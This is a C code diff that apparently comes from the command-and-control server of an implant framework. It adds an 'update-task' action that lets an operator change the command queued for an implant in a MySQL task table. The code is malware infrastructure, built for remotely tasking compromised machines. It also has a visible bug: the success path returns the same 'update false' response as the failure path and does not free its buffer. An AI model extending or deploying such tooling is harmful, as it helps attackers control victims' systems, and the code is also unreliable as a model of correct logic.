@@ -146,8 +146,23 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
         cJSON_AddStringToObject(tasks_added, "status", "task_added");
         data = cJSON_Print(tasks_added);
         cJSON_Delete(tasks_added);
-    } 
-    else {
+    } else if (strcmp(action_value, "update-task") == 0) {
+        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
+        if (!command || !cJSON_IsString(command)) {
+            free(data);
+            return strdup("{\"error\": \"Invalid command\"}");
+        }
+        cJSON *task_id = cJSON_GetObjectItem(rinfo, "task_id");
+        if (!task_id || !cJSON_IsNumber(task_id)) {
+            free(data);
+            return strdup("{\"error\": \"Invalid Task Id\"}");
+        }   
+        if (!update_task(con, task_id->valueint, command->valuestring)) {
+            free(data);
+            return strdup("{\"update\": \"false\"}");
+        } 
+        return strdup("{\"update\": \"false\"}");
+    } else {
         free(data);
         return strdup("{\"error\": \"Invalid action\"}");
     }
